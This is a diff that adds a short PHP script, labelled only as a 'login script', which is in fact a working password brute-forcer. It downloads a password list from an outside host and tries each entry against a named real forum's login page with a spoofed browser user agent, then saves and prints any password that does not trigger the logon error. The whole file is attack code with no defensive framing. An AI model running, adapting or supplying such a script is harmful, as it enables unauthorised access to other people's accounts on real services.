@@ -1,0 +1,50 @@
+<?php 
+/**
+ * @author : wusuopubupt
+ * @date : 2014-02-28
+ * @desc : login script
+ * 
+ * */
+$error_msg = '/logon/';
+$pass_file = "download.txt";
+
+$url = "http://bbs.byr.cn/wForum/logon.php";
+$username = "yourusername";
+$passwords = file("http://www.mathandcs.com/password.txt");
+
+
+foreach($passwords as $password) {
+	$content = http_get($url, $username, $password);
+	if(validate($content, $error_msg)) {
+		file_put_contents($pass_file, $content);
+		var_dump($password);
+	}
+}
+
+function http_get($url, $username, $password, $ref_url=NULL) {
+	$ch = curl_init();
+	$field_data = "id=".$username."&passwd=".$password."&CookieDate=2";/*change here.*/
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.81 Safari/537.36");
+	if ($ref_url) {
+		curl_setopt($ch, CURLOPT_REFERER, $ref_url);
+	}
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $field_data);
+	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	$data = curl_exec($ch);
+	curl_close($ch);
+	return $data;
+}
+
+function validate($content, $error_msg) {
+	if (preg_match($error_msg, $content, $matches)){
+		return false;
+	}
+	else {
+		return true;
+	}
+}
